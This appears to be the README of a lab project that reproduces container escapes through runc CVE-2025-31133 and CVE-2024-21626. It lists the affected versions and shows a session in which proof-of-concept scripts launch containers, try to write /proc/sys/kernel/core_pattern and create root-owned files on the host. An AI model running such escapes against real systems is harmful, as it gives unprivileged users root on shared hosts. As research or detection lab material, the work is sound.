# Assumptions

- Host runs vulnerable version of runc:
  - For [CVE-2025-31133](https://www.cve.org/CVERecord?id=CVE-2025-31133): `1.2.7` and below, `1.3.0-rc.1` through `1.3.2`, `1.4.0-rc.1` and `1.4.0-rc.2`.
  - For [CVE-2024-21626](https://www.cve.org/CVERecord?id=CVE-2024-21626): `1.0.0-rc93` through `1.1.11`.
- Unprivileged user is able to create containers with `runc` (or containerd's `ctr`) from OCI configuration file and plain rootfs.

# Usage

```shellsession
you@local:container-escape-ebpf$ make deploy # Setup `aws` CLI with `aws configure` and `terraform/terraform.tfvars` prior to deploying.
you@local:container-escape-ebpf$ make ssh

ubuntu@vm:~$ python3 /tmp/cve-2025-31133-poc.py
Launched container: axXjevWaJ1deK3OuharhsOZrK0FsrEUh
/bin/sh: can't create /proc/sys/kernel/core_pattern: Read-only file system
Exploit did not succeed. Retrying...
Launched container: PVlXAUsXqGN1qNWCd4sgAlVxFr1GvyT2
/bin/sh: can't create /proc/sys/kernel/core_pattern: Read-only file system
Exploit did not succeed. Retrying...
Launched container: J3vwzaXv5DOfCEciwQiAAUHMuAb8sZXe
Exploit succeeded!
ubuntu@vm:~$ ls -la /pwned_by_cve_2025_31133
-rw-r--r-- 1 root root 0 Jan  3 03:00 /pwned_by_cve_2025_31133

ubuntu@vm:~$ python3 /tmp/cve-2024-21626-poc.py
Launched container: EUzjLqq54unAfuAZZzysTPVEqRtuswBm
ubuntu@vm:~$ ls -la /pwned_by_cve_2024_21626
-rw-r--r-- 1 root root 0 Jan  4 02:45 /pwned_by_cve_2024_21626

bash-5.1# exit
exit
ubuntu@vm:~$ exit
exit
you@local:container-escape-ebpf$ make teardown # Don't forget to teardown resources!
```
